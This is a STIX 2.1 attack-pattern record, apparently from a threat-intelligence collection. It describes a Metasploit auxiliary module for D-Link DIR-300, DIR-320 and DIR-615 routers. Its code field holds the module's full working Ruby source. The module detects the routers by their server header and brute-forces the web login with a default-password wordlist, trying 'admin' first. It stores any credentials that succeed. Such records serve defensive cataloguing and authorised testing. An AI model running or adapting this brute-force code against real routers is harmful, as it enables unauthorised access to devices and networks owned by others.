{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a2b2e991-5b72-4460-a0dc-263905fdf9f4",
    "created": "2024-08-14T16:30:06.772163Z",
    "modified": "2024-08-14T16:30:06.772167Z",
    "name": "D-Link DIR-300A / DIR-320 / DIR-615D HTTP Login Utility",
    "description": " This module attempts to authenticate to different D-Link HTTP management services. It has been tested on D-Link DIR-300 Hardware revision A, D-Link DIR-615 Hardware revision D and D-Link DIR-320 devices. It is possible that this module also works with other models. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/dlink_dir_300_615_http_login.rb",
            "external_id": "dlink_dir_300_615_http_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'D-Link DIR-300A / DIR-320 / DIR-615D HTTP Login Utility',\n      'Description' => %q{\n          This module attempts to authenticate to different D-Link HTTP management\n        services. It has been tested on D-Link DIR-300 Hardware revision A, D-Link DIR-615\n        Hardware revision D and D-Link DIR-320 devices. It is possible that this module\n        also works with other models.\n      },\n      'Author'         =>\n        [\n          'hdm', # http_login module\n          'Michael Messner <devnull[at]s3cur1ty.de>' #dlink login included\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME',  [ false, \"Username for authentication (default: admin)\",\"admin\" ]),\n        OptPath.new('PASS_FILE',  [ false, \"File containing passwords, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_pass.txt\") ]),\n      ])\n  end\n\n  def target_url\n    proto = \"http\"\n    if rport == 443 or ssl\n      proto = \"https\"\n    end\n    \"#{proto}://#{rhost}:#{rport}#{@uri.to_s}\"\n  end\n\n  def is_dlink?\n    response = send_request_cgi({\n      'uri' => @uri,\n      'method' => 'GET'\n    })\n\n    if response and response.headers['Server'] and response.headers['Server'] =~ /Mathopd\\/1\\.5p6/\n      return true\n    else\n      return false\n    end\n  end\n\n  def run_host(ip)\n\n    @uri = \"/login.php\"\n\n    if is_dlink?\n      vprint_good(\"#{target_url} - D-Link device detected\")\n    else\n      vprint_error(\"#{target_url} - D-Link device doesn't detected\")\n      return\n    end\n\n    print_status(\"#{target_url} - Attempting to login\")\n\n    each_user_pass { |user, pass|\n      do_login(user, pass)\n    }\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: (ssl ? 'https' : 'http'),\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  # default to user=admin without password (default on most dlink routers)\n  def do_login(user='admin', pass='')\n    vprint_status(\"#{target_url} - Trying username:'#{user}' with password:'#{pass}'\")\n\n    response  = do_http_login(user,pass)\n    result = determine_result(response)\n\n    if result == :success\n      print_good(\"#{target_url} - Successful login '#{user}' : '#{pass}'\")\n      report_cred(ip: rhost, port: rport, user: user, password: pass, proof: response.inspect)\n\n      return :next_user\n    else\n      vprint_error(\"#{target_url} - Failed to login as '#{user}'\")\n      return\n    end\n  end\n\n  def do_http_login(user,pass)\n    begin\n      response = send_request_cgi({\n        'uri' => @uri,\n        'method' => 'POST',\n        'vars_post' => {\n          \"ACTION_POST\" => \"LOGIN\",\n          \"LOGIN_USER\" => user,\n          \"LOGIN_PASSWD\" => pass,\n          \"login\" => \"+Log+In+\"\n        }\n      })\n      return nil if response.nil?\n      return nil if (response.code == 404)\n      return response\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{target_url} - Failed to connect to the web server\")\n      return nil\n    end\n  end\n\n  def determine_result(response)\n    return :abort if response.nil?\n    return :abort unless response.kind_of? Rex::Proto::Http::Response\n    return :abort unless response.code\n    if response.body =~ /\\<META\\ HTTP\\-EQUIV\\=Refresh\\ CONTENT\\=\\'0\\;\\ url\\=index.php\\'\\>/\n      return :success\n    end\n    return :fail\n  end\nend\n"
}